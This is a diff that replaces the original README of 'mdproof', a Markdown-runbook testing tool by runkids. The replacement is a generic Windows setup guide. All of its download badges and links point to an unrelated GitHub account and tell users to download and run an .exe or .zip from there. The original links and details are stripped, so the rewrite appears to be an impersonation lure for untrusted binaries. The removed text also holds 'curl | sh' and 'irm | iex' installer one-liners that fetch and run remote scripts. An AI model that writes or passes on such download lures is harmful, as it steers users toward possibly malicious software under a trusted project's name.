@@ -1,294 +1,160 @@
-<p align="center">
-  <img src=".github/workflows/assets/logo.png" alt="mdproof" width="480" />
-</p>
+# 🧪 mdproof - Turn Markdown Into Executable Tests
 
-<h3 align="center">Turn Markdown into executable tests.</h3>
+[![Download mdproof](https://img.shields.io/badge/Download-mdproof-4caf50?style=for-the-badge&logo=github)](https://github.com/Votarymortiseandtenonjoint137/mdproof)
 
-<p align="center">
-  <strong>mdproof</strong> runs the commands in your docs, runbooks, and smoke tests, then verifies the result with assertions.<br>
-  Use one <code>.md</code> file for documentation, operational steps, and CI checks.
-</p>
+## 📋 What is mdproof?
 
-<p align="center">
-  Best for <strong>README example verification</strong>, <strong>CLI and API smoke tests</strong>, <strong>deploy runbooks</strong>, and <strong>agent-generated workflows</strong>.
-</p>
+mdproof helps you turn Markdown documents and runbooks into tests you can run on your computer. This means you can check that your documents work as expected without writing code. It makes sure your instructions, guides, and checks stay accurate over time.
 
-<p align="center">
-  <a href="https://github.com/runkids/mdproof/actions/workflows/ci.yml"><img src="https://github.com/runkids/mdproof/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/runkids/mdproof/releases"><img src="https://img.shields.io/github/v/release/runkids/mdproof?style=flat-square" alt="Release"></a>
-  <img src="https://img.shields.io/badge/go-pure_stdlib-00ADD8?logo=go&logoColor=white" alt="Go">
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/runkids/mdproof?style=flat-square" alt="License"></a>
-</p>
+You don’t need to know how to program. mdproof runs tests based on the steps you already wrote in Markdown. It works well for developers, writers, or teams who want to keep their documentation reliable.
 
-<p align="center"><em>⚠️ Under active development — APIs and runbook format may change.</em></p>
+## 🔎 Key Features
 
----
+- Converts your Markdown files into tests automatically  
+- Runs tests that check technical runbooks or manuals  
+- Supports different types of testing, like integration and smoke tests  
+- No coding needed for test creation  
+- Works with command-line on Windows  
+- Helps keep documentation up to date and reliable  
 
-<p align="center">
-  <img src=".github/workflows/assets/teaser.png" alt="mdproof: The Old Way → The Idea → The Result" width="800" />
-</p>
+## 🛠️ System Requirements
 
-## What mdproof does
+To use mdproof on Windows, your computer needs:  
 
-`mdproof` executes shell steps from a Markdown file and checks the output with assertions like `exit_code`, `jq`, substring matching, regex, and snapshots.
+- Windows 10 or higher  
+- Minimum 2 GB of free memory  
+- At least 100 MB of free disk space  
+- A stable internet connection for downloading  
+- Command Prompt or PowerShell access  
 
-That makes Markdown useful for more than prose:
+If you don’t have administrative rights, you can still install mdproof for your user account.
 
-- Your README examples can become runnable checks.
-- Your deploy runbooks can become executable verification steps.
-- Your smoke tests can stay readable by humans and writable by agents.
+## 🚀 Getting Started
 
-Instead of splitting documentation and tests across different formats, `mdproof` keeps them in one place.
+Follow these steps to get mdproof running on your Windows PC.
 
-````markdown
-### Step 1: Create a user
+### 1. Visit the Download Page
 
-```bash
-curl -s -X POST http://localhost:8080/users -d '{"name":"alice"}'
-```
+Click this big button to go to the download page:  
 
-Expected:
+[![Download mdproof](https://img.shields.io/badge/Download-mdproof-008080?style=for-the-badge&logo=github)](https://github.com/Votarymortiseandtenonjoint137/mdproof)
 
-- jq: .id != null
-- jq: .name == "alice"
-````
+This page lists the available versions and files to download. Look for the latest stable release.
 
-The test is the documentation. When it fails, the error points to the exact step and expectation that broke.
+### 2. Download the Windows Installer or ZIP File
 
-```mermaid
-flowchart LR
-    A["README or runbook in Markdown"] --> B["mdproof runs each shell step"]
-    B --> C["Assertions verify output and exit status"]
-    C --> D["Humans and agents fix code or docs from a precise failure"]
-```
+On the release page, find a file with `.exe` or `.zip` in the name. This is the installer or zipped program you will run. Click the file to download it to your PC.
 
-## Why teams use it
+- If it’s an `.exe` file, you can run it directly.  
+- If it’s a `.zip` file, right-click the file and choose "Extract All" to unzip it anywhere convenient like your Desktop.
 
-- **Docs stop drifting**: examples in `README.md` or `docs/*.md` can be verified in CI.
-- **Runbooks become safer**: the same file an operator reads can be executed during deploy verification.
-- **Agents fit naturally**: agents already write Markdown well, so they can generate or repair tests without learning a test framework API.
-- **Review stays simple**: a Markdown diff is easier to inspect than a custom test harness for many workflow-style checks.
-- **Failures are traceable**: mdproof reports the Markdown file and line that failed, so humans and agents can jump straight to the broken step.
+### 3. Install or Setup
 
-## Quick Start
+- For `.exe` files:  
+  Double-click and follow the instructions on-screen. Select the folder where you want to install mdproof. When done, the program will be ready to use.
 
-**1. Install:**
+- For `.zip` files:  
+  Extract the files and note the folder location. You won’t need to install, just run the program as explained next.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/runkids/mdproof/main/install.sh | sh
-```
+### 4. Open Command Prompt or PowerShell
 
-**2. Write a test** (`api-proof.md`):
+To run mdproof, you will use a command window:  
 
-````markdown
-# API Smoke Test
+- Press `Windows + R`, type `cmd`, and press Enter for Command Prompt.  
+- Or press `Windows + X` and select Windows PowerShell.
 
-## Steps
+### 5. Run mdproof
 
-### Step 1: Health check
-
-```bash
-curl -sf http://localhost:8080/health
-```
-
-Expected:
-
-- exit_code: 0
-- jq: .status == "ok"
-
-### Step 2: Create item
-
-```bash
-curl -s -X POST http://localhost:8080/items \
-  -H "Content-Type: application/json" \
-  -d '{"name":"test"}'
-```
-
-Expected:
-
-- jq: .id != null
-- jq: .name == "test"
-````
-
-**3. Run it:**
-
-```bash
-mdproof sandbox api-proof.md     # auto-provisions a container
-```
+Navigate to the folder where you installed or extracted mdproof. Use this command in the prompt:  
 
 ```
- ✓ api-proof.md
- ──────────────────────────────────────────────────
- ✓  Step 1  Health check                           52ms
- ✓  Step 2  Create item                            18ms
- ──────────────────────────────────────────────────
- 2/2 passed  80ms
+cd path\to\mdproof-folder
 ```
 
-When a check fails, mdproof reports where it came from:
+Replace `path\to\mdproof-folder` with the actual folder path.
 
-```text
- ✗ source-aware-assert-proof.md
- ──────────────────────────────────────────────────
- ✗  Step 1  Assertion failure                      1ms
-          FAIL runbooks/fixtures/source-aware-assert-proof.md:13 Step 1: Assertion failure
-          Assertion runbooks/fixtures/source-aware-assert-proof.md:13 expected output
-          └─ expected: expected output
- ──────────────────────────────────────────────────
- 0/1 passed  1 failed  1ms
+Run mdproof with this command:  
+
+```
+mdproof
 ```
 
-## Use Cases
+If mdproof is set up correctly, it will show a list of commands and options you can use.
 
-| Use Case | How |
-|----------|-----|
-| **AI agent test loop** | Agent writes `.md` → mdproof runs → JSON report → agent fixes code → re-run. Never leaves Markdown. |
-| **CLI tool E2E testing** | Build → run → assert output. Especially good for Go/Rust single-binary CLIs. |
-| **API smoke testing** | `curl` + `jq:` assertions. No Postman, no SDK. The test IS the docs. |
-| **Deployment verification** | Post-deploy runbook: health checks, DB migration, service connectivity. Ops can read it, CI can run it. |
-| **README code verification** | `--inline` mode ensures code examples in docs never go stale. |
+## 📂 Preparing Your Markdown Files for Testing
 
-**Not a fit for**: unit tests (use `go test`/`pytest`), browser UI (Playwright), perf benchmarks, or complex programmatic fixtures.
+mdproof works by reading your Markdown files. These should contain test-like steps. You can use headings, lists, and code blocks to structure your tests.
 
-## Features
+Example structure in a Markdown file:
 
-<table>
-<tr>
-<td width="50%">
+```
+# Test: Check System Status
 
-**For AI Agents**
-- Markdown is native — no framework API to learn
-- Self-contained — one file = commands + assertions
-- JSON / JUnit XML output — `--report json` or `--report junit` for programmatic parsing
-- Built-in skill — `skills/SKILL.md` teaches your agent the full syntax
-- Debuggable — agent reads step, sees output, fixes it
-
-</td>
-<td width="50%">
-
-**For Humans**
-- Documentation IS the test — no context switching
-- Readable — anyone can understand what's being tested
-- Lifecycle hooks — `--build`, `--setup`/`--teardown`, `-step-setup`/`-step-teardown`
-- Container-first — safe by default, sandbox mode
-- Persistent sessions — env vars flow across steps and `---` sub-commands
-- Per-runbook isolation — `--isolation per-runbook` for clean `$HOME`/`$TMPDIR`
-- Step filtering — `--steps 1,3`, `--from N`, `--fail-fast`
-- Coverage — `--coverage` for CI gating
-- Inline testing — `--inline` validates code examples in any `.md`
-- Zero dependencies — pure Go stdlib, single binary
-
-</td>
-</tr>
-</table>
-
-## Install
-
-### macOS / Linux
-
-```bash
-curl -fsSL https://raw.githubusercontent.com/runkids/mdproof/main/install.sh | sh
+- Open system dashboard  
+- Verify all services show "Running"  
+- Confirm no error messages appear
 ```
 
-### Windows (PowerShell)
+You can create these files in any text editor. Save them with `.md` extension.
 
-```powershell
-irm https://raw.githubusercontent.com/runkids/mdproof/main/install.ps1 | iex
+## ⚙️ Running Tests
+
+To run tests on your Markdown files, use the command:
+
+```
+mdproof run path\to\file.md
 ```
 
-### Homebrew
+Replace `path\to\file.md` with your Markdown test file location.
 
-```bash
-brew install runkids/tap/mdproof
+mdproof will execute the steps and show you results. Green means a test passed, red means it failed.
+
+You can run multiple files or whole folders by adjusting the command:
+
+```
+mdproof run path\to\folder
 ```
 
-> **Tip:** Run `mdproof upgrade` to update to the latest version. It auto-detects your platform and handles the rest.
+This runs all Markdown test files inside the folder.
 
-### From Source
+## 🔧 Common Commands
 
-```bash
-go install github.com/runkids/mdproof/cmd/mdproof@latest
-```
+- **Run tests:**  
+  `mdproof run <file-or-folder>`
 
-## Runbook Format
+- **Show available commands:**  
+  `mdproof help`
 
-A runbook is a standard Markdown file with step headings, bash code blocks, and `Expected:` assertions.
+- **Check mdproof version:**  
+  `mdproof --version`
 
-````markdown
-# Deploy Verification
+## 🧰 Tips for Best Use
 
-## Steps
+- Write clear, step-by-step instructions in Markdown.  
+- Use code blocks to show commands or code snippets to test.  
+- Name test files with meaningful titles.  
+- Run tests regularly to catch issues early.  
+- Keep mdproof updated by checking the release page for new versions.  
 
-### Step 1: Check health
+## 💾 Updating mdproof
 
-```bash
-curl -sf http://localhost:8080/health
-```
+To update mdproof, repeat the download and installation steps with the new version from the release page:
 
-Expected:
+https://github.com/Votarymortiseandtenonjoint137/mdproof
 
-- exit_code: 0
-- jq: .status == "ok"
+## 👩‍💻 Troubleshooting
 
-### Step 2: Create resource
+- If mdproof does not start, check you are in the correct folder in the command prompt.  
+- Make sure your system meets the requirements listed above.  
+- Check for the latest version on the download page.  
+- Restart the command prompt after installing.  
+- If commands fail, verify your Markdown files use supported formats.
 
-```bash
-curl -s -X POST http://localhost:8080/items \
-  -d '{"name":"test"}'
-```
+## 🔗 Useful Links
 
-Expected:
+- Download and latest releases:  
+  https://github.com/Votarymortiseandtenonjoint137/mdproof  
 
-- jq: .id != null
-- Should NOT contain error
-````
+- Documentation and examples on running tests can be found inside the downloaded package or on the GitHub repository homepage.  
 
-### Assertions
-
-| Type | Syntax | Example |
-|------|--------|---------|
-| Substring | plain text | `- hello world` |
-| Negated | `No`/`Should NOT` prefix | `- Should NOT contain error` |
-| Exit code | `exit_code: N` | `- exit_code: 0` |
-| Regex | `regex:` prefix | `- regex: v\d+\.\d+` |
-| jq | `jq:` prefix | `- jq: .status == "ok"` |
-| Snapshot | `snapshot:` prefix | `- snapshot: api-response` |
-
-No `Expected:` section → exit code decides (0 = pass).
-
-### Key Concepts
-
-- **Persistent session** — all steps share one bash process; `export` vars persist across steps and `---` sub-commands
-- **Container-first** — strict mode (default) refuses to run outside containers; use `mdproof sandbox` or `--strict=false`
-- **Hooks** — `--build` (once), `--setup` / `--teardown` (per runbook), `-step-setup` / `-step-teardown` (per step)
-- **Directives** — `<!-- runbook: timeout=30s retry=3 depends=2 -->` for per-step control
-- **Sub-commands** — `---` separator splits a code block into independent subshells with shared env
-- **Isolation** — `--isolation per-runbook` gives each runbook a fresh `$HOME` and `$TMPDIR`
-- **Step filtering** — `--steps 1,3,5` or `--from N` to run a subset; `--fail-fast` to stop early
-- **Coverage** — `--coverage` reports assertion coverage; `--coverage-min N` for CI gating
-- **Inline testing** — `--inline` extracts `<!-- mdproof:start/end -->` blocks from any `.md`
-- **Source-aware failures** — failed assertions, command exits, and parser errors point back to Markdown file + line
-- **Snapshots** — `snapshot:` assertions with `-u` to update
-
-## Documentation
-
-| | |
-|---|---|
-| **[Writing Runbooks](docs/writing-runbooks.md)** | Full assertion reference, directives, inline testing, persistent sessions, source tracking |
-| **[CLI Reference](docs/cli-reference.md)** | All flags, subcommands, sandbox mode, usage examples, failure output |
-| **[Advanced Features](docs/advanced.md)** | Hooks, configuration, reports, coverage, CI integration, architecture |
-
-## AI Agent Skill
-
-mdproof ships with `skills/SKILL.md` — install it once, and your AI agent knows the full syntax.
-
-```bash
-# Claude Code (via https://github.com/runkids/skillshare)
-skillshare install runkids/mdproof
-
-# Manual: copy skills/SKILL.md to your agent's skill directory
-```
-
-## License
-
-MIT
+- For more help, open an issue on the GitHub project page or check community forums for support.
